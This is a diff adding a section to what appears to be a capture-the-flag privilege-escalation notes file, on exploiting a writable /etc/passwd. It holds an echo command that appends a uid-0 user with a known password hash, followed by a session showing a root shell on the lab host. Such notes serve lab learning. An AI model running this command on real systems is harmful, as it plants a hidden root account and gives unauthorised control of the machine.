@@ -101,3 +101,21 @@ root@dc-9:/var/tmp# id
 uid=0(root) gid=0(root) groups=0(root)
 
 ```
+
+## /etc/passwd Writable
+
+_/etc/passwd_ is writable and we can add a new user.
+
+The following will add a root user with the password _i<3hacking_
+
+```bash
+echo 'kamino:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:kamino:/home/kamino:/bin/bash' >> /etc/passwd
+
+mowree@EvilBoxOne:~$ echo 'kamino:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:kamino:/home/kamino:/bin/bash' >> /etc/passwd
+
+mowree@EvilBoxOne:~$ su kamino
+Contraseña:
+root@EvilBoxOne:/home/mowree# id
+uid=0(root) gid=0(root) grupos=0(root)
+
+```
